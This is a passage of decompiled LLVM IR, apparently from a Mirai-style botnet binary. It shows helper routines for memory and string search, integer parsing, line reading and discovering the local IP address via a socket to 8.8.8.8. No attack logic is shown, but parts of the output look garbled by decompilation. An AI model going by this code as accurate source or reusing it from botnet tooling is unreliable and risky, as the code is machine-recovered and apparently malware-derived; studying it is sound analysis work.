  br i1 %v9_1040c, label %dec_label_pc_10414, label %dec_label_pc_10400

dec_label_pc_10414:                               ; preds = %dec_label_pc_10400
  %v1_10414 = load i32, i32* @r0, align 4
  ret i32 %v1_10414

; uselistorder directives
  uselistorder i32 %v1_10408, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_1042c = icmp sgt i32 %arg4, %arg2
  br i1 %v7_1042c, label %dec_label_pc_10434, label %dec_label_pc_1043c

dec_label_pc_10434:                               ; preds = %dec_label_pc_10450, %dec_label_pc_1043c, %entry, %dec_label_pc_1047c
  %storemerge = phi i32 [ %v1_1047c, %dec_label_pc_1047c ], [ -1, %entry ], [ -1, %dec_label_pc_1043c ], [ -1, %dec_label_pc_10450 ]
  ret i32 %storemerge

dec_label_pc_1043c:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10434, label %dec_label_pc_10444

dec_label_pc_10444:                               ; preds = %dec_label_pc_1043c
  br label %dec_label_pc_1045c

dec_label_pc_10450:                               ; preds = %bb, %dec_label_pc_10470
  %v1_1045c3 = phi i32 [ %v1_10470, %dec_label_pc_10470 ], [ 0, %bb ]
  %v1_10450 = add i32 %v0_1047c, 1
  %v9_10454 = icmp eq i32 %v1_10450, %arg2
  br i1 %v9_10454, label %dec_label_pc_10434, label %dec_label_pc_1045c

dec_label_pc_1045c:                               ; preds = %dec_label_pc_10450, %dec_label_pc_10444
  %v0_1047c = phi i32 [ %v1_10450, %dec_label_pc_10450 ], [ 0, %dec_label_pc_10444 ]
  %v1_1045c = phi i32 [ %v1_1045c3, %dec_label_pc_10450 ], [ 0, %dec_label_pc_10444 ]
  %v2_1045c = add i32 %v1_1045c, %arg3
  %v3_1045c = inttoptr i32 %v2_1045c to i8*
  %v4_1045c = load i8, i8* %v3_1045c, align 1
  %v2_10460 = add i32 %v0_1047c, %arg1
  %v3_10460 = inttoptr i32 %v2_10460 to i8*
  %v4_10460 = load i8, i8* %v3_10460, align 1
  %v9_10464 = icmp eq i8 %v4_10460, %v4_1045c
  br i1 %v9_10464, label %dec_label_pc_10470, label %bb

bb:                                               ; preds = %dec_label_pc_1045c
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_10450

dec_label_pc_10470:                               ; preds = %dec_label_pc_1045c
  %v1_10470 = add i32 %v1_1045c, 1
  store i32 %v1_10470, i32* @ip, align 4
  %v9_10474 = icmp eq i32 %v1_10470, %arg4
  br i1 %v9_10474, label %dec_label_pc_1047c, label %dec_label_pc_10450

dec_label_pc_1047c:                               ; preds = %dec_label_pc_10470
  %v1_1047c = add i32 %v0_1047c, 1
  br label %dec_label_pc_10434

; uselistorder directives
  uselistorder i32 %v1_10470, { 1, 2, 0 }
  uselistorder i32 %v1_1045c, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10450, { 1, 0 }
  uselistorder label %dec_label_pc_10434, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_10494

dec_label_pc_10494:                               ; preds = %.thread, %dec_label_pc_104a8, %bb, %entry
  %v0_10494 = phi i32 [ %tmp, %entry ], [ %v5_10494, %bb ], [ %v5_10494, %dec_label_pc_104a8 ], [ %v5_10494, %.thread ]
  %v1_10494 = inttoptr i32 %v0_10494 to i8*
  %v2_10494 = load i8, i8* %v1_10494, align 1
  %v5_10494 = add i32 %v0_10494, 1
  %v7_10498 = icmp eq i8 %v2_10494, 9
  br i1 %v7_10498, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_10494
  br label %dec_label_pc_10494

bb:                                               ; preds = %dec_label_pc_10494
  %v8_1049c = icmp eq i8 %v2_10494, 32
  br i1 %v8_1049c, label %dec_label_pc_10494, label %dec_label_pc_104a8

dec_label_pc_104a8:                               ; preds = %bb
  %v7_104a8 = icmp eq i8 %v2_10494, 10
  br i1 %v7_104a8, label %dec_label_pc_10494, label %dec_label_pc_104b0

dec_label_pc_104b0:                               ; preds = %dec_label_pc_104a8
  %v7_104b0 = icmp eq i8 %v2_10494, 45
  br i1 %v7_104b0, label %dec_label_pc_105a0, label %dec_label_pc_104b8

dec_label_pc_104b8:                               ; preds = %dec_label_pc_104b0
  %v7_104b8 = icmp eq i8 %v2_10494, 43
  br i1 %v7_104b8, label %bb54, label %dec_label_pc_104c8

bb54:                                             ; preds = %dec_label_pc_104b8
  %v2_104bc = inttoptr i32 %v5_10494 to i8*
  %v3_104bc = load i8, i8* %v2_104bc, align 1
  %v6_104bc = add i32 %v0_10494, 2
  br label %dec_label_pc_104c8

dec_label_pc_104c8:                               ; preds = %bb54, %dec_label_pc_104b8, %dec_label_pc_105a0
  %v1_1057039 = phi i32 [ %v5_105a0, %dec_label_pc_105a0 ], [ %v5_10494, %dec_label_pc_104b8 ], [ %v6_104bc, %bb54 ]
  %v0_104f010.in = phi i8 [ %v2_105a0, %dec_label_pc_105a0 ], [ %v2_10494, %dec_label_pc_104b8 ], [ %v3_104bc, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_105a0 ], [ 2147483647, %dec_label_pc_104b8 ], [ 2147483647, %bb54 ]
  %v0_105b0 = phi i32 [ 1, %dec_label_pc_105a0 ], [ 0, %dec_label_pc_104b8 ], [ 0, %bb54 ]
  %v2_104d0 = udiv i32 %storemerge1, %arg2
  %v3_104d0 = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_104f0.outer

dec_label_pc_104f0.outer:                         ; preds = %.thread5, %dec_label_pc_104c8
  %v1_10570.ph = phi i32 [ %v6_10570, %.thread5 ], [ %v1_1057039, %dec_label_pc_104c8 ]
  %v2_1056c.ph = phi i32 [ %v5_1056c, %.thread5 ], [ 0, %dec_label_pc_104c8 ]
  %v1_10530.ph.in = phi i8 [ %v3_10570, %.thread5 ], [ %v0_104f010.in, %dec_label_pc_104c8 ]
  %v1_10548.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_104c8 ]
  %v3_1053c = icmp uge i32 %v2_1056c.ph, %v2_104d0
  %v9_1053c = icmp eq i32 %v2_1056c.ph, %v2_104d0
  %v2_10540 = xor i1 %v3_1053c, true
  %v3_10540 = or i1 %v9_1053c, %v2_10540
  %v2_10544 = xor i1 %v9_1053c, true
  %v3_10544 = and i1 %v3_1053c, %v2_10544
  %v2_10564 = icmp eq i1 %v9_1053c, false
  br label %dec_label_pc_104f0

dec_label_pc_104f0:                               ; preds = %dec_label_pc_104f0.outer, %dec_label_pc_10578
  %v1_10570 = phi i32 [ %v5_10578, %dec_label_pc_10578 ], [ %v1_10570.ph, %dec_label_pc_104f0.outer ]
  %v1_10548 = phi i32 [ -1, %dec_label_pc_10578 ], [ %v1_10548.ph, %dec_label_pc_104f0.outer ]
  %v1_10530.in = phi i8 [ %v2_10578, %dec_label_pc_10578 ], [ %v1_10530.ph.in, %dec_label_pc_104f0.outer ]
  %v1_10530 = zext i8 %v1_10530.in to i32
  %v1_104f0 = urem i32 %v1_10530, 256
  %v1_104f4 = add nsw i32 %v1_104f0, -48
  %v1_104fc = add nsw i32 %v1_104f0, -97
  %v1_10500 = add nsw i32 %v1_10530, -48
  %v1_10504 = add nsw i32 %v1_104f0, -65
  %tmp87 = icmp ult i32 %v1_104f4, 10
  br i1 %tmp87, label %dec_label_pc_10534, label %dec_label_pc_1050c

dec_label_pc_1050c:                               ; preds = %dec_label_pc_104f0
  %v2_1050c = icmp ugt i32 %v1_10504, 24
  %v7_1050c = icmp eq i32 %v1_10504, 25
  %v2_10510 = xor i1 %v7_1050c, true
  %v3_10510 = and i1 %v2_1050c, %v2_10510
  br i1 %v3_10510, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_1050c
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_1050c, %bb55
  %v0_1052415 = phi i32 [ %v1_10500, %dec_label_pc_1050c ], [ 0, %bb55 ]
  %v2_10514 = xor i1 %v2_1050c, true
  %v3_10514 = or i1 %v7_1050c, %v2_10514
  br i1 %v3_10514, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10524 = phi i32 [ %v0_1052415, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10510, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_1051c = icmp ugt i32 %v1_104fc, 24
  %v11_1051c = icmp eq i32 %v1_104fc, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10520 = phi i1 [ %v7_1050c, %bb58 ], [ %v11_1051c, %bb59 ]
  %v0_10520 = phi i1 [ %v2_1050c, %bb58 ], [ %v6_1051c, %bb59 ]
  %v2_10520 = xor i1 %v1_10520, true
  %v3_10520 = and i1 %v0_10520, %v2_10520
  br i1 %v3_10520, label %dec_label_pc_10584, label %dec_label_pc_10524

dec_label_pc_10524:                               ; preds = %bb60
  %v2_10524 = icmp eq i32 %v0_10524, 0
  %. = select i1 %v2_10524, i32 87, i32 55
  %v2_10530 = sub nsw i32 %v1_10530, %.
  br label %dec_label_pc_10534

dec_label_pc_10534:                               ; preds = %dec_label_pc_104f0, %dec_label_pc_10524
  %v0_1054833 = phi i32 [ %v1_10504, %dec_label_pc_104f0 ], [ %., %dec_label_pc_10524 ]
  %v3_1056c = phi i32 [ %v1_10500, %dec_label_pc_104f0 ], [ %v2_10530, %dec_label_pc_10524 ]
  %v2_10534 = sub i32 %v3_1056c, %arg2
  %v4_10534 = xor i32 %v3_1056c, %arg2
  %v5_10534 = xor i32 %v2_10534, %v3_1056c
  %v6_10534 = and i32 %v5_10534, %v4_10534
  %v7_10534 = icmp slt i32 %v6_10534, 0
  %v8_10534 = icmp slt i32 %v2_10534, 0
  %v2_10538 = xor i1 %v8_10534, %v7_10534
  br i1 %v2_10538, label %dec_label_pc_1053c, label %dec_label_pc_10584

dec_label_pc_1053c:                               ; preds = %dec_label_pc_10534
  br i1 %v3_10540, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_1053c
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_1053c, %bb63
  %v0_1054832 = phi i32 [ %v0_1054833, %dec_label_pc_1053c ], [ 0, %bb63 ]
  br i1 %v3_10544, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10548 = phi i32 [ %v0_1054832, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10548, 0
  %v4_10548 = zext i1 %tmp88 to i32
  %v5_10548 = or i32 %v0_10548, %v4_10548
  %v7_10548 = icmp eq i32 %v5_10548, 0
  br i1 %v7_10548, label %dec_label_pc_10550, label %dec_label_pc_10578

dec_label_pc_10550:                               ; preds = %bb66
  %v2_1055c = sub i32 %v3_1056c, %v3_104d0
  %v4_1055c = xor i32 %v3_1056c, %v3_104d0
  %v5_1055c = xor i32 %v2_1055c, %v3_1056c
  %v6_1055c = and i32 %v5_1055c, %v4_1055c
  %v7_1055c = icmp slt i32 %v6_1055c, 0
  %v8_1055c = icmp slt i32 %v2_1055c, 0
  %v9_1055c = icmp eq i32 %v3_1056c, %v3_104d0
  %v3_10560 = xor i1 %v8_1055c, %v7_1055c
  %v4_10560 = or i1 %v9_1055c, %v3_10560
  br i1 %v4_10560, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10550
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10550
  br i1 %v2_10564, label %.thread5, label %dec_label_pc_10578

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_1056c = mul i32 %v2_1056c.ph, %arg2
  %v5_1056c = add i32 %v3_1056c, %v4_1056c
  %v2_10570 = inttoptr i32 %v1_10570 to i8*
  %v3_10570 = load i8, i8* %v2_10570, align 1
  %v6_10570 = add i32 %v1_10570, 1
  br label %dec_label_pc_104f0.outer

dec_label_pc_10578:                               ; preds = %thread-pre-split, %bb66
  %v1_10578 = inttoptr i32 %v1_10570 to i8*
  %v2_10578 = load i8, i8* %v1_10578, align 1
  %v5_10578 = add i32 %v1_10570, 1
  br label %dec_label_pc_104f0

dec_label_pc_10584:                               ; preds = %dec_label_pc_10534, %bb60
  %v1_10584 = icmp slt i32 %v1_10548, 0
  %v2_105b0 = icmp eq i32 %v0_105b0, 0
  br i1 %v1_10584, label %dec_label_pc_105b0, label %dec_label_pc_1058c

dec_label_pc_1058c:                               ; preds = %dec_label_pc_10584
  br i1 %v2_105b0, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_1058c
  %v2_10590 = sub i32 0, %v2_1056c.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_1058c, %bb69
  %v1_1059c = phi i32 [ -2147483648, %bb71 ], [ %v2_1056c.ph, %dec_label_pc_1058c ], [ %v2_10590, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_1059c

dec_label_pc_105a0:                               ; preds = %dec_label_pc_104b0
  %v1_105a0 = inttoptr i32 %v5_10494 to i8*
  %v2_105a0 = load i8, i8* %v1_105a0, align 1
  %v5_105a0 = add i32 %v0_10494, 2
  br label %dec_label_pc_104c8

dec_label_pc_105b0:                               ; preds = %dec_label_pc_10584
  br i1 %v2_105b0, label %.thread43, label %bb71

.thread43:                                        ; preds = %dec_label_pc_105b0
  br label %bb70

bb71:                                             ; preds = %dec_label_pc_105b0
  br label %bb70

; uselistorder directives
  uselistorder i1 %v2_105b0, { 1, 0 }
  uselistorder i32 %v2_1055c, { 1, 0 }
  uselistorder i32 %v2_10534, { 1, 0 }
  uselistorder i32 %v3_1056c, { 0, 6, 1, 2, 5, 3, 4, 7 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_1050c, { 1, 2, 0 }
  uselistorder i1 %v2_1050c, { 1, 0, 2 }
  uselistorder i32 %v1_104f0, { 1, 2, 0 }
  uselistorder i32 %v1_10530, { 1, 0, 2 }
  uselistorder i32 %v1_10548, { 1, 0 }
  uselistorder i32 %v1_10570, { 2, 3, 1, 0 }
  uselistorder i1 %v9_1053c, { 1, 0, 2 }
  uselistorder i1 %v3_1053c, { 1, 0 }
  uselistorder i32 %v2_1056c.ph, { 1, 0, 4, 3, 2 }
  uselistorder i32 %v3_104d0, { 1, 0, 2 }
  uselistorder i32 %v2_104d0, { 1, 0 }
  uselistorder i32 %v5_10494, { 4, 3, 5, 2, 1, 0 }
  uselistorder i32 %v0_10494, { 0, 1, 3, 2 }
  uselistorder i32 25, { 18, 19, 9, 2, 10, 3, 11, 4, 12, 0, 13, 5, 14, 1, 15, 6, 7, 16, 8, 17 }
  uselistorder i8 32, { 8, 9, 10, 11, 12, 13, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i8 9, { 2, 0, 1 }
  uselistorder label %bb70, { 1, 0, 3, 2 }
  uselistorder label %bb66, { 1, 0 }
  uselistorder label %bb64, { 1, 0 }
  uselistorder label %dec_label_pc_10534, { 1, 0 }
  uselistorder label %bb60, { 1, 0 }
  uselistorder label %bb58, { 1, 0 }
  uselistorder label %bb56, { 1, 0 }
  uselistorder label %dec_label_pc_104f0, { 1, 0 }
  uselistorder label %dec_label_pc_104c8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10494, { 1, 2, 0, 3 }
}

define i32 @util_fdgets(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_105c0 = load i32, i32* @r4, align 4
  store i32 %v3_105c0, i32* %stack_var_-24, align 4
  %v6_105c0 = load i32, i32* @r5, align 4
  %v9_105c0 = load i32, i32* @r6, align 4
  %v12_105c0 = load i32, i32* @r7, align 4
  %v15_105c0 = load i32, i32* @r8, align 4
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_105d8

dec_label_pc_105d8:                               ; preds = %dec_label_pc_105fc.dec_label_pc_105d8_crit_edge, %entry
  %v0_105dc = phi i32 [ %v0_105dc.pre, %dec_label_pc_105fc.dec_label_pc_105d8_crit_edge ], [ %arg3, %entry ]
  %v0_105d8 = phi i32 [ %v5_105fc, %dec_label_pc_105fc.dec_label_pc_105d8_crit_edge ], [ %tmp, %entry ]
  store i32 %v0_105d8, i32* @r1, align 4
  store i32 1, i32* @r2, align 4
  %v1_105e4 = call i32 @__libc_read(i32 %v0_105dc)
  %v7_105e8 = icmp eq i32 %v1_105e4, 1
  %v0_105f0 = load i32, i32* @r5, align 4
  br i1 %v7_105e8, label %dec_label_pc_105f0, label %dec_label_pc_10608

dec_label_pc_105f0:                               ; preds = %dec_label_pc_105d8
  %v1_105f0 = add i32 %v0_105f0, 1
  store i32 %v1_105f0, i32* @r5, align 4
  %v1_105f4 = load i32, i32* @r8, align 4
  %v6_105f8 = icmp slt i32 %v1_105f0, %v1_105f4
  br i1 %v6_105f8, label %dec_label_pc_105fc, label %.loopexit

dec_label_pc_105fc:                               ; preds = %dec_label_pc_105f0
  %v0_105fc = load i32, i32* @r4, align 4
  %v1_105fc = inttoptr i32 %v0_105fc to i8*
  %v2_105fc = load i8, i8* %v1_105fc, align 1
  %v3_105fc = zext i8 %v2_105fc to i32
  store i32 %v3_105fc, i32* @r3, align 4
  %v5_105fc = add i32 %v0_105fc, 1
  store i32 %v5_105fc, i32* @r4, align 4
  %v7_10600 = icmp eq i8 %v2_105fc, 10
  br i1 %v7_10600, label %dec_label_pc_10608, label %dec_label_pc_105fc.dec_label_pc_105d8_crit_edge

dec_label_pc_105fc.dec_label_pc_105d8_crit_edge:  ; preds = %dec_label_pc_105fc
  %v0_105dc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_105d8

dec_label_pc_10608:                               ; preds = %dec_label_pc_105d8, %dec_label_pc_105fc
  %v0_10608 = phi i32 [ %v1_105f0, %dec_label_pc_105fc ], [ %v0_105f0, %dec_label_pc_105d8 ]
  %v2_10608 = icmp eq i32 %v0_10608, 0
  br i1 %v2_10608, label %bb, label %.loopexit

bb:                                               ; preds = %dec_label_pc_10608
  store i32 0, i32* @r7, align 4
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_105f0, %dec_label_pc_10608, %bb
  %v0_10610 = load i32, i32* @r7, align 4
  %v2_10614 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10614, i32* @r4, align 4
  store i32 %v6_105c0, i32* @r5, align 4
  store i32 %v9_105c0, i32* @r6, align 4
  store i32 %v12_105c0, i32* @r7, align 4
  store i32 %v15_105c0, i32* @r8, align 4
  ret i32 %v0_10610

; uselistorder directives
  uselistorder i32 %v5_105fc, { 1, 0 }
  uselistorder label %.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10608, { 1, 0 }
}

define i32 @util_local_addr() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1061c = load i32, i32* @r4, align 4
  %v6_1061c = load i32, i32* @r5, align 4
  %v9_1061c = load i32, i32* @r6, align 4
  store i32 16, i32* @r6, align 4
  store i32 16, i32* %stack_var_-20, align 4
  %v0_1062c = call i32 @__GI___errno_location()
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_10634 = inttoptr i32 %v0_1062c to i32*
  store i32 0, i32* %v2_10634, align 4
  %v0_10640 = load i32, i32* %r4.global-to-local, align 4
  %v3_10644 = call i32 @socket(i32 2, i32 2, i32 %v0_10640)
  %v7_10648 = icmp eq i32 %v3_10644, -1
  store i32 %v3_10644, i32* @r5, align 4
  br i1 %v7_10648, label %bb, label %dec_label_pc_10658

bb:                                               ; preds = %entry
  %v1_10650 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_106a4

dec_label_pc_10658:                               ; preds = %entry
  %v2_10664 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_10664, i32* @r4, align 4
  %v0_10670 = load i32, i32* @r6, align 4
  store i32 2, i32* %stack_var_-36, align 4
  %v3_10684 = call i32 @__libc_connect(i32 %v3_10644, i32 %v2_10664, i32 %v0_10670)
  store i32 %v2_10664, i32* @r1, align 4
  %v2_1068c = ptrtoint i32* %stack_var_-20 to i32
  %v0_10690 = load i32, i32* @r5, align 4
  %v3_10694 = call i32 @__GI_getsockname(i32 %v0_10690, i32 %v2_10664, i32 %v2_1068c)
  %v0_10698 = load i32, i32* @r5, align 4
  %v1_1069c = call i32 @__GI___libc_close(i32 %v0_10698)
  br label %dec_label_pc_106a4

dec_label_pc_106a4:                               ; preds = %bb, %dec_label_pc_10658
  %storemerge = phi i32 [ 134744072, %dec_label_pc_10658 ], [ %v1_10650, %bb ]
  store i32 %v3_1061c, i32* @r4, align 4
  store i32 %v6_1061c, i32* @r5, align 4
  store i32 %v9_1061c, i32* @r6, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_10664, { 1, 0, 2, 3 }
  uselistorder i32 %v3_10644, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_connect, { 7, 8, 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @socket, { 23, 24, 22, 4, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 0, 10, 9, 8, 7, 6, 5, 1, 3, 2 }
  uselistorder i32 ()* @__GI___errno_location, { 4, 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_106a4, { 1, 0 }
}

define i32 @util_stristr(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp23 = ptrtoint i8* %arg1 to i32
  %v3_106b4 = load i8, i8* %tmp, align 1
  %v4_106b4 = zext i8 %v3_106b4 to i32
  store i32 %v4_106b4, i32* @r3, align 4
  %v2_106b8 = icmp eq i8 %v3_106b4, 0
  br i1 %v2_106b8, label %bb, label %dec_label_pc_106cc

bb:                                               ; preds = %entry
  br label %dec_label_pc_106e0

dec_label_pc_106cc:                               ; preds = %entry
  br label %dec_label_pc_106d0

dec_label_pc_106d0:                               ; preds = %dec_label_pc_106d0, %dec_label_pc_106cc
  %v0_106d0 = phi i32 [ %v1_106d0, %dec_label_pc_106d0 ], [ 0, %dec_label_pc_106cc ]
  %v1_106d0 = add i32 %v0_106d0, 1
  %v2_106d4 = add i32 %v1_106d0, %arg2
  %v3_106d4 = inttoptr i32 %v2_106d4 to i8*
  %v4_106d4 = load i8, i8* %v3_106d4, align 1
  %v6_106d4 = zext i8 %v4_106d4 to i32
  store i32 %v6_106d4, i32* @r3, align 4
  %v2_106d8 = icmp eq i8 %v4_106d4, 0
  br i1 %v2_106d8, label %dec_label_pc_106e0, label %dec_label_pc_106d0

dec_label_pc_106e0:                               ; preds = %dec_label_pc_106d0, %bb
  %v0_1072421 = phi i32 [ %v4_106b4, %bb ], [ %v1_106d0, %dec_label_pc_106d0 ]
  %v0_106e82 = load i32, i32* @r1, align 4
  %tmp29 = icmp slt i32 %v0_106e82, 1
  br i1 %tmp29, label %dec_label_pc_10738, label %dec_label_pc_106f4

dec_label_pc_106f4:                               ; preds = %dec_label_pc_106e0, %dec_label_pc_106e8.backedge
  %v0_106ec.in = phi i32 [ %v0_106ec, %dec_label_pc_106e8.backedge ], [ %v0_106e82, %dec_label_pc_106e0 ]
  %v1_10700 = phi i32 [ %v1_1070015, %dec_label_pc_106e8.backedge ], [ 0, %dec_label_pc_106e0 ]
  %v0_106f4 = phi i32 [ %v5_106f4, %dec_label_pc_106e8.backedge ], [ %tmp23, %dec_label_pc_106e0 ]
  %v0_106ec = add i32 %v0_106ec.in, -1
  %v1_106f4 = inttoptr i32 %v0_106f4 to i8*
  %v2_106f4 = load i8, i8* %v1_106f4, align 1
  %v3_106f4 = zext i8 %v2_106f4 to i32
  %v5_106f4 = add i32 %v0_106f4, 1
  %v1_106f8 = add nsw i32 %v3_106f4, -65
  %v2_10700 = add i32 %v1_10700, %arg2
  %v3_10700 = inttoptr i32 %v2_10700 to i8*
  %v4_10700 = load i8, i8* %v3_10700, align 1
  %v6_10700 = zext i8 %v4_10700 to i32
  store i32 %v6_10700, i32* @r3, align 4
  %v1_10704 = add nsw i32 %v6_10700, -65
  %tmp38 = icmp ult i32 %v1_106f8, 26
  br i1 %tmp38, label %bb30, label %bb31

bb30:                                             ; preds = %dec_label_pc_106f4
  %v5_10708 = or i32 %v3_106f4, 96
  br label %bb31

bb31:                                             ; preds = %dec_label_pc_106f4, %bb30
  %v0_10714 = phi i32 [ %v3_106f4, %dec_label_pc_106f4 ], [ %v5_10708, %bb30 ]
  %tmp39 = icmp ult i32 %v1_10704, 26
  br i1 %tmp39, label %bb32, label %bb33

bb32:                                             ; preds = %bb31
  %v5_10710 = or i32 %v6_10700, 96
  store i32 %v5_10710, i32* @r3, align 4
  br label %bb33

bb33:                                             ; preds = %bb31, %bb32
  %v1_10714 = phi i32 [ %v6_10700, %bb31 ], [ %v5_10710, %bb32 ]
  %v9_10714 = icmp eq i32 %v0_10714, %v1_10714
  br i1 %v9_10714, label %dec_label_pc_10720, label %bb34

bb34:                                             ; preds = %bb33
  br label %dec_label_pc_106e8.backedge

dec_label_pc_106e8.backedge:                      ; preds = %bb34, %dec_label_pc_10720
  %v1_1070015 = phi i32 [ 0, %bb34 ], [ %v1_10720, %dec_label_pc_10720 ]
  %tmp35 = icmp slt i32 %v0_106ec, 1
  br i1 %tmp35, label %dec_label_pc_10738, label %dec_label_pc_106f4

dec_label_pc_10720:                               ; preds = %bb33
  %v1_10720 = add i32 %v1_10700, 1
  %v9_10724 = icmp eq i32 %v0_1072421, %v1_10720
  br i1 %v9_10724, label %dec_label_pc_1072c, label %dec_label_pc_106e8.backedge

dec_label_pc_1072c:                               ; preds = %dec_label_pc_10720
  %v2_1072c = sub i32 %v5_106f4, %tmp23
  br label %dec_label_pc_10738

dec_label_pc_10738:                               ; preds = %dec_label_pc_106e8.backedge, %dec_label_pc_106e0, %dec_label_pc_1072c
  %storemerge = phi i32 [ %v2_1072c, %dec_label_pc_1072c ], [ -1, %dec_label_pc_106e0 ], [ -1, %dec_label_pc_106e8.backedge ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_10720, { 1, 0 }
  uselistorder i32 %v0_106f4, { 1, 0 }
  uselistorder i32 %v1_10700, { 1, 0 }
  uselistorder i32 %tmp23, { 1, 0 }
  uselistorder i32 26, { 0, 1, 5, 2, 3, 4 }
  uselistorder label %dec_label_pc_10738, { 2, 0, 1 }
  uselistorder label %dec_label_pc_106e8.backedge, { 1, 0 }
  uselistorder label %bb33, { 1, 0 }
  uselistorder label %bb31, { 1, 0 }
  uselistorder label %dec_label_pc_106f4, { 1, 0 }
}

define i32 @util_strcmp(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_10740 = load i8, i8* %arg1, align 1
  %v2_10744 = icmp eq i8 %v2_10740, 0
  br i1 %v2_10744, label %bb, label %dec_label_pc_10750

bb:                                               ; preds = %entry
  %v3_10740 = zext i8 %v2_10740 to i32
  br label %dec_label_pc_10764

dec_label_pc_10750:                               ; preds = %entry
  br label %dec_label_pc_10754

dec_label_pc_10754:                               ; preds = %dec_label_pc_10754, %dec_label_pc_10750
  %v0_10754 = phi i32 [ %v1_10754, %dec_label_pc_10754 ], [ 0, %dec_label_pc_10750 ]
  %v1_10754 = add i32 %v0_10754, 1
  %v2_10758 = add i32 %v1_10754, %tmp
  %v3_10758 = inttoptr i32 %v2_10758 to i8*
  %v4_10758 = load i8, i8* %v3_10758, align 1
  %v2_1075c = icmp eq i8 %v4_10758, 0
  br i1 %v2_1075c, label %dec_label_pc_10764, label %dec_label_pc_10754

dec_label_pc_10764:                               ; preds = %dec_label_pc_10754, %bb
  %v0_107b03 = phi i32 [ %v3_10740, %bb ], [ %v1_10754, %dec_label_pc_10754 ]
  %v1_10764 = inttoptr i32 %arg2 to i8*
  %v2_10764 = load i8, i8* %v1_10764, align 1
  %v3_10764 = zext i8 %v2_10764 to i32
  store i32 %v3_10764, i32* @r3, align 4
  %v2_10768 = icmp eq i8 %v2_10764, 0
  br i1 %v2_10768, label %bb21, label %dec_label_pc_10774

bb21:                                             ; preds = %dec_label_pc_10764
  store i32 %v3_10764, i32* @r2, align 4
  br label %dec_label_pc_10788

dec_label_pc_10774:                               ; preds = %dec_label_pc_10764
  br label %dec_label_pc_10778

dec_label_pc_10778:                               ; preds = %dec_label_pc_10778, %dec_label_pc_10774
  %v0_10778 = phi i32 [ %v1_10778, %dec_label_pc_10778 ], [ 0, %dec_label_pc_10774 ]
  %v1_10778 = add i32 %v0_10778, 1
  store i32 %v1_10778, i32* @r2, align 4
  %v2_1077c = add i32 %v1_10778, %arg2
  %v3_1077c = inttoptr i32 %v2_1077c to i8*
  %v4_1077c = load i8, i8* %v3_1077c, align 1
  %v6_1077c = zext i8 %v4_1077c to i32
  store i32 %v6_1077c, i32* @r3, align 4
  %v2_10780 = icmp eq i8 %v4_1077c, 0
  br i1 %v2_10780, label %dec_label_pc_10788, label %dec_label_pc_10778

dec_label_pc_10788:                               ; preds = %dec_label_pc_10778, %bb21
